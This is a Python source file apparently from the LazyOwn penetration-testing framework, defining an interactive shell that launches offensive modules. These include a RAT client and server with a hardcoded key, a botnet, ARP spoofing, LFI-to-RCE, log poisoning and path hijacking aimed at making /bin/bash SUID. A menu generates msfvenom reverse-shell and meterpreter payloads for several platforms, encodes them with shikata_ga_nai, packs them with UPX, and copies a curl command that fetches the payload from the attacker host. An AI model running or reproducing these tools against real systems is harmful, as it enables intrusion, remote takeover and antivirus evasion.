#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
lazyown

Autor: Gris Iscomeback
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Este archivo contiene la definición de la lógica en la clase LazyOwnShell

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""

from cmd import Cmd
from utils import *


class LazyOwnShell(Cmd):
    prompt = getprompt()

    if NOBANNER:
        intro = ""
    else:
        intro = f"""    {YELLOW}[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} 
    {WHITE}[*] interactive s{RED}H{WHITE}ell! Type ? to list commands{BLUE}
    {RED}[!] Please do not use in military or secret service organizations, 
    {RED}[!] or for illegal purposes (this is non-binding, 
    {RED}[!] these *** ignore laws and ethics anyway){BLUE}
    {GREEN}[+] Github: {BLUE}{UNDERLINE}https://github.com/grisuno/LazyOwn{RESET}
    {GREEN}[+] Web: {BLUE}{UNDERLINE}https://grisuno.github.io/LazyOwn/{RESET}
    {GREEN}[+] Reddit: {BLUE}{UNDERLINE}https://www.reddit.com/r/LazyOwn/{RESET}
    {GREEN}[+] Facebook: {BLUE}{UNDERLINE}https://web.facebook.com/profile.php?id=61560596232150{RESET}
    {GREEN}[+] hackTheBox: {BLUE}{UNDERLINE}https://app.hackthebox.com/teams/overview/6429 {RESET}
        """
    activate_virtualenv("env")

    # Diccionario para almacenar alias
    aliases = {
        "auto": "pyautomate",
        "aslr": "run lazyaslrcheck",
        "discovery": "run lazynmapdiscovery",
        "ftpsniff": "run lazyftpsniff",
        "gpt": "run lazygptcli",
        "ls": "list",
        "nmap": "run lazynmap",
        "now": "clock",
        "p": "payload",
        "poison": "run lazylogpoisoning",
        "q": "exit",
        "sniff": "run lazysniff",
        "venom": "run lazymsfvenom",
        "ww": "whatweb",
    }

    def __init__(self):
        """
        Initializer for the LazyOwnShell class.

        This method sets up the initial parameters and scripts for an instance of
        the LazyOwnShell class. It initializes a dictionary of parameters with default
        values and a list of script names that are part of the LazyOwnShell toolkit.

        Attributes:
            params (dict): A dictionary of parameters with their default values.
            scripts (list): A list of script names included in the toolkit.
            output (str): An empty string to store output or results.
        """
        super().__init__()
        self.params = {
            "binary_name": "gzip",
            "api_key": None,
            "prompt": None,
            "url": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "reverse_shell_port": None,
            "path": "/",
            "rhost": None,
            "lhost": None,
            "rport": 1337,
            "lport": 1337,
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None,
            "exploitdb": "/usr/share/exploitdb/exploits/",
            "dirwordlist": "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "usrwordlist": "/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt",
            "dnswordlist": "/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazyaslrcheck",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownratcli",
            "lazyownrat",
            "lazygath",
            "lazysniff",
            "lazynetbios",
            "lazybotnet",
            "lazybotcli",
            "lazyhoneypot",
            "lazysearch_bot",
            "lazylfi2rce",
            "lazylogpoisoning",
            "lazymsfvenom",
            "lazypathhijacking",
            "lazyarpspoofing",
            "lazyftpsniff",
            "lazyssh77enum",
            "lazywerkzeugdebug",
        ]
        self.output = ""
        self.custom_prompt = getprompt()

    def default(self, line):
        """
        Handles undefined commands, including aliases.

        This method checks if a given command (or its alias) exists within the class
        by attempting to find a corresponding method. If the command or alias is not
        found, it prints an error message.

        :param line: The command or alias to be handled.
        :type line: str
        :return: None
        """

        # Obtener el comando o alias
        command = self.aliases.get(line, line)

        # Separar el comando y los argumentos si existe
        parts = command.split(maxsplit=1)
        cmd_name = parts[0]
        cmd_args = parts[1] if len(parts) > 1 else ""

        # Ejecutar el comando si existe
        method_name = f"do_{cmd_name}"
        if hasattr(self, method_name):
            return getattr(self, method_name)(cmd_args)
        else:
            print_error(f"{YELLOW} Not Found {BLUE}{line}{RESET}")

    def one_cmd(self, command):
        """
        Internal function to execute commands.

        This method attempts to execute a given command using `onecmd` and captures
        the output. It sets the `output` attribute based on whether the command was
        executed successfully or an exception occurred.

        :param command: The command to be executed.
        :type command: str
        :return: A message indicating the result of the command execution.
        :rtype: str
        """

        self.output = self.get_output
        try:
            self.onecmd(command)  # Ejecuta el comando directamente
            self.output = "Command executed successfully."
            return self.output
        except Exception as e:
            self.output = str(e)

    def do_set(self, line):
        """
        Set a parameter value.

        This function takes a line of input, splits it into a parameter and a value,
        and sets the specified parameter to the given value if the parameter exists.

        :param line: A string containing the parameter and value to be set.
                    Expected format: '<parameter> <value>'.
        :type line: str
        :return: None
        :raises: ValueError if the input line does not contain exactly two elements.
        """
        args = shlex.split(line)
        if len(args) != 2:
            print_error(f"{YELLOW} Usage: set <parameter> <value>{RESET}")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print_msg(f"{YELLOW}{param} set to {GREEN}{value} {RESET}")
        else:
            print_error(f"Unknown parameter: {param}{RESET}")
        return

    def do_show(self, line):
        """
        Show the current parameter values.

        This function iterates through the current parameters and their values,
        printing each parameter and its associated value.

        :param line: This parameter is not used in the function.
        :type line: str
        :return: None
        """
        for param, value in self.params.items():
            print_msg(f"{param}: {value}")

    def do_list(self, line):
        """
        Lists all available scripts in the modules directory.

        This method prints a list of available scripts in a formatted manner, arranging
        them into columns. It shows each script with sufficient spacing for readability.

        :param line: This parameter is not used in the method.
        :type line: str
        :return: None
        """

        scripts = self.scripts
        num_columns = 3

        if not scripts:
            print_error(f"No available scripts.{RESET}")
            return

        # Calcular el ancho máximo para cada columna
        max_len = max(len(script) for script in scripts)
        column_width = max_len + 2  # Añadir un poco de espacio extra para separación

        # Crear el formato de cada línea en columnas
        rows = [
            scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)
        ]

        # Mostrar los resultados en columnas
        print_msg(f"Available scripts to run:{RESET}")
        for row in rows:
            # Crear una fila con los elementos ajustados al ancho de columna
            print_msg(
                f"   ".join(
                    f"{script.ljust(column_width)}{RESET}    " for script in row
                )
            )

    def do_run(self, line):
        """
        Runs a specific LazyOwn script.

        This method executes a script from the LazyOwn toolkit based on the provided
        script name. If the script is not recognized, it prints an error message.
        To see available scripts, use the `list` or `help list` commands.

        :param line: The command line input containing the script name.
        :type line: str
        :return: None
        """

        args = shlex.split(line)
        if not args:
            print_error(f"Usage: {GREEN} run <script_name> {RESET}")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print_error(f"Unknown script: {CYAN}{script_name}{RESET}")

    def run_lazysearch(self):
        """
        Runs the internal module `modules/lazysearch.py`.

        This method executes the `lazysearch` script from the specified path, using
        the `binary_name` parameter from the `self.params` dictionary. If `binary_name`
        is not set, it prints an error message.

        :return: None
        """
        binary_name = self.params["binary_name"]
        if not binary_name:
            print_error("binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    def run_lazysearch_gui(self):
        """Run internal module modules/LazyOwnExplorer.py"""
        self.run_script("modules/LazyOwnExplorer.py")
        return

    def run_lazyown(self):
        """Run internal module modules/lazyown.py"""
        self.run_script("modules/lazyown.py")
        return

    def run_update_db(self):
        """Run internal module modules/update_db.sh to update the db of binary exploitables from gtofbins"""
        os.system("./modules/update_db.sh")
        return

    def run_lazynmap(self):
        """
        Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

        This method executes the `lazynmap` script, using the current working directory
        and the `rhost` parameter from the `self.params` dictionary as the target IP.
        If `rhost` is not set, it prints an error message.

        :return: None
        """

        path = os.getcwd()
        target_ip = self.params["rhost"]
        if not target_ip:
            print_error(f"rhost must be set, {GREEN}help set to more info {RESET}")
            return
        os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")
        return

    def run_lazywerkzeugdebug(self):
        """test werkzeug in debugmode Run internal module modules/lazywerkzeug.py"""
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        rport = self.params["rport"]
        lport = self.params["lport"]
        if not rhost or not lhost or not lport or not rport:
            print_error(
                "rhost, lhost, rpor, and lport must be set, to more info see: help set"
            )
            return
        self.run_script("modules/lazywerkzeug.py", rhost, rport, lhost, lport)
        return

    def run_lazygath(self):
        """Run internal module modules/lazygat.sh"""
        path = os.getcwd()
        os.system(f"sudo {path}/modules/lazygat.sh")
        return

    def run_lazynmapdiscovery(self):
        """
        Runs the internal module `modules/lazynmap.sh` with discovery mode.

        This method executes the `lazynmap` script in discovery mode. It uses the current
        working directory for locating the script.

        :return: None
        """

        path = os.getcwd()
        os.system(f"{path}/modules/lazynmap.sh -d")
        return

    def run_lazysniff(self):
        """
        Runs the internal module `modules/lazysniff.py`.

        This method executes the `lazysniff` script with the specified network device
        from the `device` parameter in `self.params`. It sets environment variables for
        language and terminal type and uses `subprocess.run` to handle the execution.

        :return: None
        """

        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    def run_lazyftpsniff(self):
        """Run internal module modules/lazyftpsniff.py"""
        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print_error("device must be set to choice the interface")
            return
        subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])

    def run_lazynetbios(self):
        """Run internal module modules/lazynetbios.py"""
        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])

    def run_lazyhoneypot(self):
        """Run internal module modules/lazyhoneypot.py"""
        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )

    def run_lazygptcli(self):
        """Run internal module modules/lazygptcli.py"""
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazygptcli.py", "--prompt", prompt)

    def run_lazysearch_bot(self):
        """Run internal module modules/lazysearch_bot.py"""
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        """Run internal module modules/lazyown_metaextract0r.py"""
        path = self.params["path"]
        if not path:
            print_error("Path must be set")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        """Run internal module modules/lazyownclient.py"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print_error("lhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        """Run internal module modules/lazyownserver.py"""
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        """Run internal module modules/lazybotnet.py"""
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        """Run internal module modules/lazylfi2rce.py"""
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print_error("rhost and rport field and lhost lport wordlist must be set")
            return
        self.run_script(
            "modules/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        """Run internal module modules/lazylogpoisoning.py"""
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print_error("rhost and lhost must be set")
            return
        self.run_script(
            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
        )

    def run_lazybotcli(self):
        """Run internal module modules/lazybotcli.py"""
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyssh77enum(self):
        """Run internal module modules/lazybrutesshuserenum.py"""
        wordlist = self.params["usrwordlist"]
        rhost = self.params["rhost"]
        if not wordlist or not rhost:
            print_error("rhost and wordlist must be set")
            return
        print_warn(
            "this may not be accurate. using a version a little bit updated from searchsploit"
        )
        path = os.getcwd()
        os.system(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")

    def run_lazyburpfuzzer(self):
        """Run internal module modules/lazyown_burpfuzzer.py"""
        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)
        return

    def run_lazyreverse_shell(self):
        """Run internal module modules/lazyreverse_shell.sh"""
        ip = self.params["rhost"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print_error(
                "rhost and reverse_shell_port must be set, more info see, help set"
            )
            return
        os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")
        return

    def run_lazyarpspoofing(self):
        """Run internal module modules/lazyarpspoofing.py"""
        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print_error("lhost, lhost, and device must be set")
            return
        os.system(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")
        return

    def run_lazyattack(self):
        """Run internal module modules/lazyatack.sh"""
        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["rhost"]
        attacker_ip = self.params["lhost"]
        if not mode or not target_ip or not attacker_ip:
            print_error("mode, rhost, and lhost must be set, more info see help set")
            return
        os.system(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )
        return

    def run_lazymsfvenom(self):
        """
        Runs the `msfvenom` tool to generate payloads based on user input.

        Prompts the user to select a payload type from a list and executes the corresponding
        `msfvenom` command to generate a payload. Moves the generated payloads to a `sessions`
        directory and sets appropriate permissions. Optionally compresses the payloads using UPX
        and handles a C payload with shikata_ga_nai.

        :param line: Command line arguments for the script.
        :return: None
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lhost or not lport:
            print_error("lport and lhost must be set")
            return

        # Prompt user for choice
        print_msg("Select payload type:")
        print_msg("1: linux/x86/meterpreter/reverse_tcp")
        print_msg("2: linux/x64/meterpreter/reverse_tcp")
        print_msg("3: windows/meterpreter/reverse_tcp")
        print_msg("4: windows/x64/meterpreter/reverse_tcp")
        print_msg("5: osx/x86/meterpreter/reverse_tcp")
        print_msg("6: osx/x64/meterpreter/reverse_tcp")
        print_msg("7: linux/x86/shell_reverse_tcp")
        print_msg("8: linux/x64/shell_reverse_tcp")
        print_msg("9: windows/shell_reverse_tcp")
        print_msg("10: windows/x64/shell_reverse_tcp")
        print_msg("11: osx/x86/shell_reverse_tcp")
        print_msg("12: osx/x64/shell_reverse_tcp")
        print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
        choice = input("Enter your choice (1-13): ").strip()

        # Define payload commands
        commands = {
            "1": f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "2": f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "3": f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "4": f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "5": f'msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "6": f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "7": f'msfvenom -p linux/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "8": f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "9": f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "10": f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "11": f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "12": f'msfvenom -p osx/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "13": (
                f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > payload.c'
            ),
        }

        # Check if the choice is valid
        if choice in commands:
            # Execute the chosen command
            os.system(commands[choice])
            print_msg(f"Generated payload: {commands[choice]}")

            # Move and set permissions for the generated payload
            if choice in commands:
                os.system("mkdir -p sessions")
                os.system(
                    "mv shell* sessions 2>/dev/null"
                )  # Move files and suppress errors if no files match
                os.system("chmod +x sessions/shell*")

            print_msg("Payloads moved to sessions/")

            # Apply UPX to compress the payloads if applicable
            if choice in ["1", "2", "7", "8"]:
                if os.path.exists("sessions/shell.elf"):
                    os.system("upx sessions/shell.elf")
                if os.path.exists("sessions/shell64.elf"):
                    os.system("upx sessions/shell64.elf")
            if choice in ["3", "4", "9", "10"]:
                if os.path.exists("sessions/shell.exe"):
                    os.system("upx sessions/shell.exe")
                if os.path.exists("sessions/shell64.exe"):
                    os.system("upx sessions/shell64.exe")
            if choice in ["5", "6", "11", "12"]:
                if os.path.exists("sessions/shell.macho"):
                    os.system("upx sessions/shell.macho")
                if os.path.exists("sessions/shell64.macho"):
                    os.system("upx sessions/shell64.macho")
            if choice == "13":
                # Handle the payload in C (shikata_ga_nai)
                if os.path.exists("payload.c"):
                    print_msg("Payload in C generated: payload.c")
                    os.system(
                        f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
                    )
                    print_msg(
                        f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard"
                    )

        else:
            print_error("Invalid choice. Please select a number between 1 and 13.")

    def run_lazyaslrcheck(self):
        """
        Checks the status of Address Space Layout Randomization (ASLR) on the system by reading
        the value from /proc/sys/kernel/randomize_va_space.

        The function executes the `cat` command to retrieve the ASLR status and prints the result.
        Based on the retrieved value, it indicates whether ASLR is fully activated, partially activated,
        or deactivated.

        :returns: None
        """

        print_msg(
            f"{GREEN}Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}"
        )
        result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
        print_msg(result)
        if result == "0":
            print_error(f"    {GREEN}[+] ASLR is {RED}deactivated{RESET}")
        elif result == "1":
            print_warn(f"    {GREEN}[+] ASLR is partial {YELLOW}activated{RESET}")
        elif result == "2":
            print_msg(f"    {GREEN}[+] ASLR is activated{RESET}")
        return

    def run_lazypathhijacking(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack.
        :returns: None
        """

        binary_name = self.params["binary_name"]
        if not binary_name:
            print_msg("binary_name must be set")
            return

        os.system(f"echo {binary_name} >> modules/tmp.sh")
        os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
        os.system(f"chmod +x /tmp/{binary_name}")
        os.system("export PATH=/tmp:$PATH")

        print_msg(f"echo {binary_name} >> modules/tmp.sh")
        print_msg(f"cp modules/tmp.sh /tmp/{binary_name}")
        print_msg(f"chmod +x /tmp/{binary_name}")
        print_msg("export PATH=/tmp:$PATH")

        print_msg(
            f"Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
        )
        return

    def run_script(self, script_name, *args):
        """Run a script with the given arguments"""
        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time"""
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line  # Agregar la salida a la variable self.output
                print_msg(line, end="")
            for line in iter(process.stderr.readline, ""):
                self.output += line  # Agregar la salida de stderr también
                print_msg(line, end="")
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print_error("[Interrupted] Process terminated")

    def do_payload(self, line):
        """Load parameters from payload.json"""
        try:
            with open("payload.json", "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            print_msg(f"Parameters loaded from{GREEN} payload.json{RESET}")
        except FileNotFoundError:
            print_error("payload.json not found")
        except json.JSONDecodeError:
            print_error("Error decoding payload.json")

    def do_exit(self, arg):
        """Exit the command line interface."""
        # Si deseas, puedes implementar confirmación aquí
        confirm = (
            input(f"{YELLOW}¿Seguro que quieres salir? {GREEN}(s/n): {RESET}")
            .strip()
            .lower()
        )
        if confirm == "s":
            print_msg(f"{RED}Saliendo ...{RESET}")
            sys.exit(0)
        else:
            print_warn(f"{RED}Salida Cancelada .{RESET}")
            return False

    def do_fixperm(self, line):
        """Fix Perm LazyOwn shell"""
        print_msg("[F]ix script perm")
        os.system("chmod +x modules/*.sh")
        os.system("chmod +x modules/cgi-bin/*")
        return

    def do_lazywebshell(self, line):
        """LazyOwn shell"""
        print_msg("Running Server in localhost:8888/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8888 --cgi &")
        return

    def do_getcap(self, line):
        """try get capabilities :)"""
        print_msg(f"Try get capabilities {RESET}")
        os.system("getcap -r / 2>/dev/null")
        return

    def do_getseclist(self, line):
        """get seclist :D"""
        print_msg(f"Try to get seclist wordlist [;,;] {RESET}")
        os.system("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
        && sudo unzip SecList.zip \
        && sudo  rm -f SecList.zip""")

    def do_smbclient(self, line):
        """
        Interacts with SMB shares using the `smbclient` command to perform the following operations:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
        2. If `line` (share name) is provided:
        - Attempts to access the specified SMB share on the remote host using the command: `smbclient -N \\\\{rhost}\\{line}`
        3. If `line` is not provided:
        - Lists available SMB shares on the remote host with the command: `smbclient -N -L \\\\{rhost}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

        :param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        if not rhost or not not lhost:
            print_error("rhost and lhost must be set")
            return

        if line:
            print_msg(f"Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
            os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
            return
        print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
        os.system(f"smbclient -N -L \\\\{rhost}\\")
        print_msg(
            f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
        )
        return

    def do_smbmap(self, line):
        """smbmap -H 10.10.10.3 [OPTIONS]
        Uses the `smbmap` tool to interact with SMB shares on a remote host:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
        2. If no `line` (share name or options) is provided:
        - Attempts to access SMB shares on the remote host with a default user `deefbeef` using the command: `smbmap -H {rhost} -u 'deefbeef'`
        3. If `line` is provided:
        - Executes `smbmap` with the specified options or share name using the command: `smbmap -H {rhost} -R {line}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/documents" /mnt/smb`

        :param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
        :returns: None"""
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        if not rhost or not not lhost:
            print_error("rhost and lhost must be set")
            return
        if not line:
            print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
            os.system(f"smbmap -H {rhost} -u 'deefbeef'")
            return
        print_msg(f"Try... smbmap -H {rhost} -R {line}")
        os.system(f"smbmap -H {rhost} -R {line}")
        print_msg(
            f'exploit smb if is posible mount -t cifs "//{lhost}/documents" /mnt/smb '
        )
        return

    def do_getnpusers(self, line):
        """sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
        Executes the `impacket-GetNPUsers` command to enumerate users with Kerberos pre-authentication disabled.

        1. Checks if the `line` (domain) argument is provided; if not, an error message is displayed, instructing the user to provide a domain.
        2. Executes `impacket-GetNPUsers` with the following options:
        - `-no-pass`: Skips password prompt.
        - `-usersfile sessions/users.txt`: Specifies the file containing the list of users to check.

        :param line: The domain to query. Must be provided in the format `domain.com`. Example usage: `getnpusers domain.com`
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
        Replace `<domain>` with the actual domain name you want to query."""

        if not line:
            print_error(
                "You must pass the domain by argument ex: getnpusers domain.com more info help getnpusers"
            )
            return
        os.system(
            f"sudo impacket-GetNPUsers {line}/ -no-pass -usersfile sessions/users.txt"
        )
        return

    def do_psexec(self, line):
        """
        Copies the `rhost` IP address to the clipboard and updates the prompt with the IP address.

        1. Retrieves the `rhost` IP address from the `self.params` parameter.
        2. Checks if the `rhost` is valid using `check_rhost()`. If invalid, the function returns without making changes.
        3. If `line` is 'clean', resets the custom prompt to its original state.
        4. Otherwise, updates the prompt to include the `rhost` IP address in the specified format.
        5. Copies the `rhost` IP address to the clipboard using `xclip`.
        6. Prints a message confirming that the IP address has been copied to the clipboard.

        :param line: This parameter determines whether the prompt should be reset or updated with the IP address.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            do_rhost <line>
        Replace `<line>` with 'clean' to reset the prompt, or any other string to update the prompt with the IP address.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
